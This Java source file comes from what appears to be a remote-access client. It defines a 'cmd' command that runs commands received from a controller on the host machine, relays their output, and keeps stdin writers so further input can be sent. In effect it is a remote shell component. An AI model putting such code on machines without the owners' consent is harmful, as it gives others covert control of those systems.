package br.com.introcdc.connect.client.commands.process;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:34
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientFileComponents;
import br.com.introcdc.connect.client.components.ClientProcessComponents;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;

public class ClientCommandProcess extends ClientCommand {

    public ClientCommandProcess() {
        super("cmd");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um comando!");
            return;
        }
        new Thread(() -> {
            ClientProcessComponents.PROCESS++;
            Integer id = ClientProcessComponents.PROCESS;
            try {
                boolean windows = System.getProperty("os.name").toLowerCase().contains("win");
                String inputInfo = (windows ? "cmd /c " : "") + input;
                File directory = new File(ClientFileComponents.FOLDER);

                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command(inputInfo.split(" "));
                processBuilder.directory(directory);

                Process process = processBuilder.start();

                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                String line;
                msg("Executando comando: " + inputInfo + " em " + ClientFileComponents.FOLDER + " (#" + id + ")");
                ClientProcessComponents.PROCESS_MAP.put(id, process);
                ClientProcessComponents.WRITER_MAP.put(id, new PrintWriter(process.getOutputStream()));
                ClientProcessComponents.LOG_PROCESS.add(id);
                ClientProcessComponents.PROCESS_LIST.put(id, inputInfo + " - " + ClientFileComponents.FOLDER);
                while ((line = bufferedReader.readLine()) != null) {
                    if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                        msg(line);
                    }
                }

                if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                    msg("Erros (se houver):");
                }
                while ((line = errorReader.readLine()) != null) {
                    if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                        msg(line);
                    }
                }

                int exitCode = process.waitFor();
                if (ClientProcessComponents.LOG_PROCESS.contains(id)) {
                    msg("\nComando finalizado com código de saída: " + exitCode);
                }
                ClientProcessComponents.LOG_PROCESS.remove(id);
                ClientProcessComponents.PROCESS_MAP.remove(id);
                ClientProcessComponents.PROCESS_LIST.remove(id);
                ClientProcessComponents.WRITER_MAP.remove(id);
            } catch (Exception exception) {
                msg("Ocorreu um erro na execução do processo #" + id + " (" + exception.getMessage() + ")");
                exception(exception);
            }
        }).start();
    }

}
